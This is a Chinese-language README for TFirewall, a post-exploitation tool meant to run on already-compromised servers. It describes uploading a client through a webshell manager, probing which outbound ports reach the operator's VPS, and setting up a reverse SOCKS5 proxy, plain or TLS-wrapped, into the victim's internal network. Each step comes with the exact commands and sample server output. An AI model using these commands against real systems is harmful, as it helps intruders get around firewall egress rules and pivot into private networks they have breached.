TFirewall是测试已控主机哪些端口可以出网及建立内网socks5代理的工具.工具主体使用golang开发,工具包含客户端及服务端,适用于windows,linux,x64,x86.

# 使用方法
## 出网检测
* 将```tfs_linux_amd64```上传到VPS服务器(假设VPS的IP地址10.10.10.10)
* 直接运行```.\tfs_linux_amd64 check```启动监听,工具会自动监听常用的TOP10端口,或通过 ```.\tfs_linux_amd64 check 20-23,53,80```自定义监听端口
* 服务端打印如下信息表示监听成功
```
root@taZ:~# ./tfs_linux_amd64 check 20-23,53,80
Check Server listening:  [20 21 22 23 53 80]
```
* 通过WEBShell管理工具将```tfc_windows_386.exe```上传到已控服务器
* 运行```tfc_windows_386.exe check 10.10.10.10```测试TOP10端口哪些可以出网
> 服务端对应命令```.\tfs_linux_amd64 check```
* 运行```tfc_windows_386.exe  check 10.10.10.10 20-23,53,80```探测指定端口
> 服务端对应命令```.\tfs_linux_amd64 check 20-23,53,80```
* 观察服务端输出即可查看客户端可以连接服务端哪些端口,使用什么协议

```
root@iZj6cbux9hc5eo9oyud2taZ:~# ./tfs_linux_amd64 check 23,80-82
Check Server listening:  [23 80 81]
RecvTCP On 172.17.20.209:23 From 175.132.138.137:16918 
RecvTCP On 172.17.20.209:80 From 175.132.138.137:50641 
RecvTCP On 172.17.20.209:81 From 175.132.138.137:38747 
RecvUDP On [::]:23 From 175.167.138.137:28822
RecvUDP On [::]:80 From 175.167.138.137:26831
RecvUDP On [::]:81 From 175.167.138.137:26832
```

## 内网socks5代理
* 将```tfs_linux_amd64```上传到VPS服务器(假设VPS的IP地址10.10.10.10)
* 通过 ```.\tfs_linux_amd64 socks5 80 1080```在80端口启动控制监听,1080启动内网socks5端口
* 服务端打印如下信息表示监听成功
```
root@vultr:~# ./tfs_linux_amd64 socks5 80 1080
Control Listening:  80
Socks5 Listening:  1080
```
* 通过WEBShell管理工具将``tfc_windows_386.exe```上传到已控服务器
* 运行```tfc_windows_386.exe socks5 10.10.10.10 80```连接服务端
* 使用10.10.10.10:1080作为内网是socks5代理(11.11.11.11是该内网出口路由器的IP地址)
```
root@vultr:~# ./tfs_linux_amd64 socks5 80 1080
Control Listening:  80
Socks5 Listening:  1080
Socks5 new socket from :  11.11.11.11:55943
Control new socket from :  11.11.11.11:55789
```

## 内网socks5代理(TLS加密)
* 将```tfs_linux_amd64```上传到VPS服务器(假设VPS的IP地址10.10.10.10)
* 将server.pem(tls公钥),server.key(tls私钥)上传到```server_linux_x64```相同目录
* 通过 ```.\tfs_linux_amd64 socks5 80 1080 tls```在80端口启动控制监听,1080启动内网socks5端口
* 服务端打印如下信息表示监听成功
```
root@vultr:~# ./tfs_linux_amd64 socks5 80 1080
Control Listening:  80
Socks5 Listening:  1080
```
* 通过WEBShell管理工具将```tfc_windows_386.exe```上传到已控服务器
* 运行```tfc_windows_386.exe socks5 10.10.10.10 80 tls```连接服务端
* 使用10.10.10.10:1080作为内网是socks5代理(11.11.11.11是该内网出口路由器的IP地址)
```
root@vultr:~# ./tfs_linux_amd64 socks5 80 1080
Control Listening:  80
Socks5 Listening:  1080
Socks5 new socket from :  11.11.11.11:55943
Control new socket from :  11.11.11.11:55789
```

# 已测试
## server
* ubuntu 18
## client
* Windows 10 
* ubuntu 16
* kali




